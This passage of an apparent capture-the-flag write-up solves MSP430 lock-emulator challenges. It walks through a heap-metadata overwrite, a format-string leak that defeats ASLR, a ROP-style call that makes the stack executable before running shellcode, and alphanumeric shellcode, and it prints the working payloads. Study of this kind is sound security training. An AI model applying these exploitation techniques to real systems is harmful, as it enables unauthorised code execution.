If we look at the login function, we can see that on lines 463e and 4648, the program is mallocing 0x10 bytes for the size in which the username and password are going to be placed in. If we then look at lines 4662 and 467c, the program is copying 0x30 bytes of data from user input. That means user input can overflow on the heap and overwrite its metadata. To solve this challenge we need to change the heaps metadata in away to get the unlock_door function to run. If we think about how the free function works, when a section of the heap is getting freed that section will be merged with the previously malloced section. So the size of that heap chunk is added to the previous chunks size. If we can make it so that when a chuck is free that size of the chunk is added to the address that contains the return address for the program. We will be able to overwrite it and change it to the unlock_door function's address. We can run the program with 2 breakpoints one on line 46a2 before the free calls and another 46b2 the return call of the login function. Using the username of 16 As and password 16 Bs we can look and see what is on the heap before free is called. Hitting the first breakpoint we can look at memory addresses 2400-243f and where the return function's address is located. Since we know we can overwrite the heaps metadata if we look and see usernames data overwrites password's heap section. Address 241f contains the previous heap address which points to the start of the heap with then points to the usernames section. Address 2420 contains the next heap section's address 2434. Finally address 2422 contains the size of the password's heap section. Since we control both the previous address and the size of the heaps section, we can user the username to add the return address's stack address location, so we can add the size to it. We do want to keep its pointer to the next heap section the same though. Now we can continue the program so we hit the second breakpoint. We can see that the stack pointer is pointing at address 439a, so that is the address that contains the return address. We now have all the necessary information to craft our exploit. For the username we are doing 16 As or 0x41 this time, then we add the address of the return pointer as the previous heap address metadata. The problem is the size of the heap isn't added to that address it will be added to the address 4 bytes up. So if minus 4 from 439a we get 4396 or for endianness 9643. That's what we need to use as our previous address. Next we will add 3424 for the next address on heap. And for the size we need to subtract 0x4564 - 0x4440 = 0x124 minus 0x1 for the in use bit so 0x123. Next we can create the password, which will be 16 Bs or 0x42, then the previous heap address 241e that contains the password data. Then we will add the next address, which will be 2408 or where the username data is, then finally 0x1 for the size of the next heap chunk. The reason we do this is so that it doesn't get merged with the one we preforming the exploit with. So for the username is "41414141414141414141414141414141964334242401" and the password is "424242424242424242424242424242421e24082401". If we try this username and password combo out we don't get the door to unlock. If we look at the address the login function is returning to we can see that we indeed do change it, but to 456a. I am not sure why its offset by 0x6 but if we subtract that from the size we put on the heap 0x123 - 0x6 = 0x11f. If had that change to the username we then finally get the door to unlock solving the challenge.

```asm
4440 <__stop_progExec__>
4440:  32d0 f000      bis	#0xf0, sr
4444:  fd3f           jmp	#0x4440 <__stop_progExec__+0x0>

4564 <unlock_door>
4564:  3012 7f00      push	#0x7f
4568:  b012 b646      call	#0x46b6 <INT>
456c:  2153           incd	sp
456e:  3041           ret

463a <login>
463a:  0b12           push	r11
463c:  0a12           push	r10
463e:  3f40 1000      mov	#0x10, r15
4642:  b012 6444      call	#0x4464 <malloc>
4646:  0a4f           mov	r15, r10
4648:  3f40 1000      mov	#0x10, r15
464c:  b012 6444      call	#0x4464 <malloc>
4650:  0b4f           mov	r15, r11
4652:  3f40 9a45      mov	#0x459a, r15
4656:  b012 1a47      call	#0x471a <puts>
465a:  3f40 c845      mov	#0x45c8, r15
465e:  b012 1a47      call	#0x471a <puts>
4662:  3e40 3000      mov	#0x30, r14
4666:  0f4a           mov	r10, r15
4668:  b012 0a47      call	#0x470a <getsn>
466c:  3f40 c845      mov	#0x45c8, r15
4670:  b012 1a47      call	#0x471a <puts>
4674:  3f40 d445      mov	#0x45d4, r15
4678:  b012 1a47      call	#0x471a <puts>
467c:  3e40 3000      mov	#0x30, r14
4680:  0f4b           mov	r11, r15
4682:  b012 0a47      call	#0x470a <getsn>
4686:  0f4b           mov	r11, r15
4688:  b012 7045      call	#0x4570 <test_password_valid>
468c:  0f93           tst	r15
468e:  0524           jz	#0x469a <login+0x60>
4690:  b012 6445      call	#0x4564 <unlock_door>
4694:  3f40 0b46      mov	#0x460b, r15
4698:  023c           jmp	#0x469e <login+0x64>
469a:  3f40 1b46      mov	#0x461b, r15
469e:  b012 1a47      call	#0x471a <puts>
46a2:  0f4b           mov	r11, r15
46a4:  b012 0845      call	#0x4508 <free>
46a8:  0f4a           mov	r10, r15
46aa:  b012 0845      call	#0x4508 <free>
46ae:  3a41           pop	r10
46b0:  3b41           pop	r11
46b2:  3041           ret

Register State

pc  46b2  sp  439a  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0046  r13 006c  r14 241e  r15 2408

Live Memory Dump

2400:   0824 0010 0000 0000 0824 1e24 2100 4141   .$.......$.$!.AA
2410:   4141 4141 4141 4141 4141 4141 4141 0024   AAAAAAAAAAAAAA.$
2420:   3424 2100 4242 4242 4242 4242 4242 4242   4$!.BBBBBBBBBBBB
2430:   4242 4242 0024 0824 9c1f 0000 0000 0000   BBBB.$.$........

Register State

pc  456a  sp  439c  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 2434
r12 0046  r13 0170  r14 241e  r15 2408

```

### Solved

username = 41414141414141414141414141414141964334241f01
password = 424242424242424242424242424242421e24082401

## Vladivostok


The challenge has to do with ASLR or Address Space Layout Randomization, which means the programs code is put on the stack randomly making it a lot harder to exploit. This doesn't make it impossible to exploit though. If we run the program for the first time we can see that we can enter a username, which is limited to only 8 characters. We can test this be entering the username, "AABBCCDDEEFFGGHH". We can enter "1122334455667788" as the password, which there isn't a specific limit said, but we can be guess to be 8 characters. After running the program we get the error "insn address unaligned". If we look at the register state, we can see that we have overwritten the instruction pointer with "55", r11 with "44", and r10 with "33". This means our password input was suppose to be limited to 8 characters, but it wasn't and now we have a buffer overflow. What makes this challenge special is we don't know where on the stack any of the functions are located. So, we don't know what to point the return call to. If we look at the function conditional_unlock_door before starting the program, we can see on line 4a46 that 0x7e is put into r13. Then on line 4a56 is moved from r13 to r15 before on line 4a60 where the INT function is called. So, we know to unlock the door we need to call INT with 0x7f in r15. The problem is we can't overwrite r13 only r10 and r11. If we look at the _aslr_main function, at line 4544 we can see that r11 is moved onto r15 and then at line 454e the INT function is called. So we now know where we want the return function to be and what to put into the r11 register. The last thing to solve is knowing where line 4544 will be after the stack is randomized.

```asm

Register State

pc  3535  sp  82a4  sr  0014  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 3333  r11 3434
r12 0000  r13 000a  r14 8298  r15 8298

4a42 <conditional_unlock_door>
4a42:  2183           decd	sp
4a44:  0e4f           mov	r15, r14
4a46:  3d40 7e00      mov	#0x7e, r13
4a4a:  0c41           mov	sp, r12
4a4c:  0c12           push	r12
4a4e:  0e12           push	r14
4a50:  0d12           push	r13
4a52:  0012           push	pc
4a54:  0212           push	sr
4a56:  0f4d           mov	r13, r15
4a58:  8f10           swpb	r15
4a5a:  024f           mov	r15, sr
4a5c:  32d0 0080      bis	#0x8000, sr
4a60:  b012 1000      call	#0x10
4a64:  3241           pop	sr
4a66:  3152           add	#0x8, sp
4a68:  0f43           clr	r15
4a6a:  2153           incd	sp
4a6c:  3041           ret

```

This last problem can be solved with a format string exploit. Since the program uses printf to show the user the username that was entered when entering the password. We can use %x to get a specific location on the stack. This memory location will be random, but always the exact same location in the code. So, if we find where on the stack the line 4544 we can use that subtract that from the address that the username gets us. So the next time we get the address in the username we can add that to it and get the exact location we want to our return to be. Rerunning the program and entering "%x%x%x" as the username gets us the username "000075ca0000". If we search the memory for "0212 0f4d 8f10", we find that line 4544 is on address 73a4. So doing the math, 0x75ca - 0x73a4 = 0x226, we get line 4544 is 226 hex away from the username address. If we enter "4141414141417f00a473" as the password we get the door to unlock. We use 6 "A"s to pad for the buffer overflow, then 0x7f to put in r11 and 0x00 to pad for the return address. So when actually solving the challenge we have to subtract 0x226 from usernames' address. 

```asm

4482 <_aslr_main>

4482:  0b12           push	r11
...
453a:  0b12           push	r11
453c:  0d12           push	r13
453e:  0b12           push	r11
4540:  0012           push	pc
4542:  0212           push	sr
4544:  0f4b           mov	r11, r15
4546:  8f10           swpb	r15
4548:  024f           mov	r15, sr
454a:  32d0 0080      bis	#0x8000, sr
454e:  b012 1000      call	#0x10
...
475a:  3041           ret


Live Memory Dump

7390:   0224 0b43 103c 1e53 8d11 0b12 0d12 0b12   .$.C.<.S........
73a0:   0012 0212 0f4b 8f10 024f 32d0 0080 b012   .....K...O2.....
73b0:   1000 3241 3152 6d4e 4d93 ed23 0e43 3d40   ..2A1RmNM..#.C=@

```

### Solved

username = %x%x%x
password = 4141414141417f00[address from username - 0x226]

## Bangalore


This is the most challenging one so far. The trick that was added to this challenge is that the memory pages can be marked as execution only or writable only. This means we can just add our own shell code in and have it execute. We need to either unlock the door without custom shell code, or find a way to disable the protections and execute our own code. But first to start off we will enter a big password that is over 16 characters, "AAABBBCCCCDDDDEEEFFFGGGGHHHH", letting the program run we will then get the error "insn address unaligned". This tells us that we have a buffer overflow and it has overflowed the return address. We can tell by the instruction pointer having 4645 in it. Now the problem we face is what exactly do we point the pointer to. It can not be on the stack where our input is. Since that is write only memory and can not be executed. One way around these protections is return orientated programming, or ROP. What this means is instead of injecting our own shell code into the program. We use the code already in the program to write a program. It will allow us to compute anything on the stack by bouncing around on return addresses that has execution privileges. Since the program is small we don't have a lot of return addresses to use. The only things we can hope for is to put 0x7f into memory then call the interrupt function, or find a way to allow execute on the stack where we have our input. 

```asm

Register State

pc  4645  sp  4000  sr  0010  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0000  r13 3fee  r14 000a  r15 0000


```

If we look at the available "gadgets" we have at our disposal. We can see that there is no way that we can get 0x7f onto the stack before calling the interrupt function.

```asm

// move contents of r14 into r15
445e:  0f4e           mov	r14, r15
4460:  3041           ret

// increase stack pointer by 0xa bytes
4474:  3150 0a00      add	#0xa, sp
4478:  3041           ret

// move a value (that we wrote) into r11
4498:  3b41           pop	r11
449a:  3041           ret

// increase stack pointer by 0x6
44d8:  3150 0600      add	#0x6, sp
44dc:  3041           ret

// clear r15
450e:  0f43           clr	r15
4510:  3041           ret

```

If we break down how the program marks a page as executable we can see that first the stack pointer starts on the return address of the function. It then puts register r14 into the address 4 down from the return address. Then  the stack pointer moves back 0x6 addresses and the interrupt function is called. Then the stack pointer get moved 0xa addresses ahead. This is the return address of the mark_page_executable, which returns to execute more of the program. Since we have control of where on the function we want to jump to we can skip the r14 part of the mark_page_executable function, because we can't control register r14. We can test calling the mark_page_executable function by giving it this password, "90909090909090909090909090909090ba44".

```asm

44b4 <mark_page_executable>
44b4:  0e4f           mov	r15, r14
44b6:  0312           push	#0x0
44b8:  0e12           push	r14
44ba:  3180 0600      sub	#0x6, sp
44be:  3240 0091      mov	#0x9100, sr
44c2:  b012 1000      call	#0x10
44c6:  3150 0a00      add	#0xa, sp
44ca:  3041           ret


Register State
pc  44b4  sp  3ffa  sr  0003  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0044
r12 0000  r13 0000  r14 0043  r15 0044

3fe0:   0000 0000 0000 0000 0000 0000 0000 ae44   ...............D
3ff0:   0000 0000 0000 4300 0000 |fc|44 0000 3c44   ......D....D..<D
                                  SP

Register State
pc  44ba  sp  3ff6  sr  0004  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0045
r12 0000  r13 0000  r14 0045  r15 0045
                                  
                                  
3fe0:   0000 0000 0000 0000 0000 0000 0000 ae44   ...............D
3ff0:   0000 0000 0000 |44|00 0000 |fc|44 0000 3c44   ......D....D..<D
                        SP

Register State
pc  44ca  sp  3ffa  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0044
r12 0000  r13 0000  r14 0044  r15 0044                
                        
3fe0:   0000 0000 0000 0000 0000 0000 0000 c644   ...............D
3ff0:   0000 0000 0000 4400 0000 |fc|44 0000 3c44   ......D....D..<D
                                  SP

```

If we look at what happens after the login function returns, we can see that we do enter the mark_page_executable function. We also enter it at line 44ba like we want. We can also see that the stack pointer is on address 4000 which is right after our input, which is the address of the mark_page_executable function we want. This means we can enter anything we want here and that page will be marked as executable. The page we want to mark is 0x3f, which is where our input is. The next thing we need is to set the return of address that mark_page_executable will use to the beginning of our input. Since we know that mark_page_executable will look for the address 0x4 addresses up from the address where the page to marked is. We can add that to our password also. We can test this out with the password, "90909090909090909090909090909090ba443f000000ee3f".

```asm

Register State
pc  44ba  sp  4000  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0000  r13 3fee  r14 000a  r15 0000

3fd0:   0000 0000 0000 0000 0000 0000 0000 5c44   ..............\D
3fe0:   7444 0000 0000 0a00 9644 0000 3845 9090   tD.......D..8E..
3ff0:   9090 9090 9090 9090 9090 9090 9090 ba44   ...............D
4000:   |00|00 0000 0000 0000 0000 0000 0000 0000   ................
         SP

Register State
pc  44ca  sp  4004  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0000  r13 3fee  r14 000a  r15 0000

3fd0:   0000 0000 0000 0000 0000 0000 0000 5c44   ..............\D
3fe0:   7444 0000 0000 0a00 9644 0000 3845 9090   tD.......D..8E..
3ff0:   9090 9090 9090 9090 c644 9090 9090 ba44   .........D.....D
4000:   0000 0000 |00|00 0000 0000 0000 0000 0000   ................
                   SP

```

Using that password gets us code execution. The problem is that the code we executed is nop code. We need to figure out how what shell code we need to execute to open the door. If we look at all the other challenges we can see that the interrupt value is put on the stacked. It is then or-ed with 0x8000 getting 0xff00 in the sr register. Then finally the interrupt 0x10 is called. This challenge is different this time the values are hard coded and there is no or-ing. The value is just placed onto the sr register and then 0x10 is called. So all we need to do is create sell code that moves 0xff00 onto the sr register, then call 0x10. This should unlock the door for us. The shell code for that is "324000ffb0121000". That is 8 characters long we need to add another 8 characters of nop code for filler. Then we need to add the address of the mark_page_executable "ba44". Then "3f00" for the page we want to mark as executable. Lastly we add 4 characters of filler, then the address of the start of out shell code. Giving us the password of, "324000ffb01210009090909090909090ba443f000000ee3f". Entering that password unlocks the door and completes the challenge.

```asm

Another challenge's interrupt call

44b0 <conditional_unlock_door>

44b0:  0412           push	r4
44b2:  0441           mov	sp, r4
44b4:  2453           incd	r4
44b6:  2183           decd	sp
44b8:  c443 fcff      mov.b	#0x0, -0x4(r4)
44bc:  3e40 fcff      mov	#0xfffc, r14
44c0:  0e54           add	r4, r14
44c2:  0e12           push	r14
44c4:  0f12           push	r15
44c6:  3012 7e00      push	#0x7e
44ca:  b012 3645      call	#0x4536 <INT>
44ce:  5f44 fcff      mov.b	-0x4(r4), r15
44d2:  8f11           sxt	r15
44d4:  3152           add	#0x8, sp
44d6:  3441           pop	r4
44d8:  3041           ret

4536 <INT>
4536:  1e41 0200      mov	0x2(sp), r14
453a:  0212           push	sr
453c:  0f4e           mov	r14, r15
453e:  8f10           swpb	r15
4540:  024f           mov	r15, sr
4542:  32d0 0080      bis	#0x8000, sr
4546:  b012 1000      call	#0x10
454a:  3241           pop	sr
454c:  3041           ret


Bangalore's interrupt call

446c:  3240 0082      mov	#0x8200, sr
4470:  b012 1000      call	#0x10

0010 <__trap_interrupt>
0010:  3041           ret


mov #0xff00, sr
call #0x10

324000ffb0121000
```


### Solved

password = 324000ffb01210009090909090909090ba443f000000ee3f

## Lagos


This challenge is a lot easier than the previous ones. It is stall a buffer overflow like most of the challenges. The difference this time is that the password can only in alphanumeric. That means we are limited to the hex codes 30-39, 41-5a, and 61-7a. That is the only trick to this challenge, which is creating shell code by using only a small number of hex codes. We need to figure out how to make shell code that puts 0x7f on the stack then calls the INT function. Or we need to get 0xff into the register sr then call 0x10. If we first try the password "AAAABBBBDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ", we can see that we overwrite the conditional_unlock_door function, which is the next function the program calls. If you look at the current instruction on the first line of conditional_unlock_door, we have three "58"s. That means we can add our shell code after the first X and it will run at the start of the conditional_unlock_door function. 

```asm

Current Instruction
5858 5859
add.b 0x5958(r8), r8

```

The problem now is what do we run. Since we know by the manual the micro controller of the device is a MSP430. We can see what op codes are only in alphanumeric. Good thing someone else has compiled that for us [here](https://gist.github.com/rmmh/8515577). The next part is the long and fun part of finding what exactly we can make that will do what we want. To skip the fun details I will explain what my shell code does. Fist we add 0x7a7a to register r9. Then we subtract 0x346C from 0x7a7a to get 0x460e, which will be used later. Next we move register r6 into register sr to clear it. Then we add 0x5444 + 0x5566 + 0x5556 getting 0xff00. Exactly what we need in register sr to open the door. The last thing we need to do is call 0x10, which the next line sets up for us. Now we move 0x460e into the instruction pointer to point it to address that contains the 0x10 call. Assembling the shell code gets us "39507a7a39706c3442463250445432506655325056553049" or "9Pzz9pl4BF2PDT2PfU2PVU0I". We append that to the end of our original password but with everything after the first X removed, which is "AAAABBBBDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWX9Pzz9pl4BF2PDT2PfU2PVU0I". Entering that in solves the challenge.

```asm

add #0x7a7a, r9
subc #0x346C,r9
mov.b    r6, sr
add      #0x5444, sr
add      #0x5566, sr
add      #0x5556, sr
mov @r9+,pc

39507a7a39706c3442463250445432506655325056553049
```


### Solved

password = AAAABBBBDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWX9Pzz9pl4BF2PDT2PfU2PVU0I
